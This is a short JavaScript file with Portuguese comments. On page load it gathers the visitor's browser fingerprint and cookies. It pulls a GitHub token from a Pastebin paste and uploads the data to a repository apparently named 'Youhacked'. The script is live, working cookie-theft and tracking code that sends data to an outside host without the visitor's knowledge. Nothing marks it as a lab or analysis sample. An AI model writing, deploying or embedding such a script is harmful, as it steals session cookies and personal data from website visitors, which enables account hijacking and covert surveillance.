// Função para coletar dados
function coletarDados() {
    const dados = {
        userAgent: navigator.userAgent,
        navegador: navigator.appName,
        plataforma: navigator.platform,
        tela: {
            largura: screen.width,
            altura: screen.height,
            profundidade: screen.colorDepth
        },
        cookies: document.cookie,
        localStorage: localStorage.length,
        sessionStorage: sessionStorage.length
    };

    // URL do Pastebin com a chave de acesso do GitHub (raw)
    const pastebinUrl = 'https://pastebin.com/raw/pN9NpSB0'; // URL fornecida por você

    // Recupera o token do GitHub armazenado no Pastebin
    fetch(pastebinUrl)
    .then(response => response.text())
    .then(token => {
        // URL do arquivo JSON no seu repositório GitHub
        const apiUrl = 'https://api.github.com/repos/wowyouhacked/Youhacked/contents/dados-usuarios.json';

        // Verifica se o arquivo já existe no repositório para pegar o SHA (se necessário)
        fetch(apiUrl, {
            method: 'GET',
            headers: {
                'Authorization': `Bearer ${token}`,
                'Accept': 'application/vnd.github.v3+json',
            }
        })
        .then(response => response.json())
        .then(data => {
            let sha = data.sha; // Pega o SHA do arquivo, se ele já existir

            // Converte os dados em JSON e em base64
            const jsonData = JSON.stringify(dados, null, 2);
            const base64Data = btoa(jsonData); // Codifica os dados em base64

            // Envia os dados para criar ou atualizar o arquivo JSON no GitHub
            return fetch(apiUrl, {
                method: 'PUT',
                headers: {
                    'Authorization': `Bearer ${token}`,
                    'Accept': 'application/vnd.github.v3+json',
                },
                body: JSON.stringify({
                    message: 'Atualizando dados coletados',
                    content: base64Data,
                    sha: sha // Inclui o SHA para atualizar o arquivo se ele já existir
                })
            });
        })
        .then(response => response.json())
        .then(data => {
            console.log('Arquivo JSON atualizado com sucesso:', data);
        })
        .catch(error => {
            console.error('Erro ao atualizar o arquivo JSON:', error);
        });
    })
    .catch(error => {
        console.error('Erro ao recuperar o token do Pastebin:', error);
    });
}

// Chama a função quando a página carregar
window.onload = function() {
    coletarDados();
};
